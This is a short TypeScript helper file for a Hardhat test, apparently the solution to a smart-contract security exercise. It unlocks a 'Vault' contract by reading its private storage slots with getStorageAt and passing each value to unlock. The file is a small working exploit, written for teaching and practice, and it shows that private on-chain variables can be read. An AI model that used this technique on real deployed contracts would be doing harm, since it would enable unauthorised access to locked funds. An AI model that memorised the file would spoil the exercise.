import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const { provider, BigNumber } = ethers;
  for (let i = 0; i < 5; i++) {
    const password = await provider.getStorageAt(
      victim.address,
      BigNumber.from(i)
    );
    await victim.unlock(password);
  }
};

export default helper;
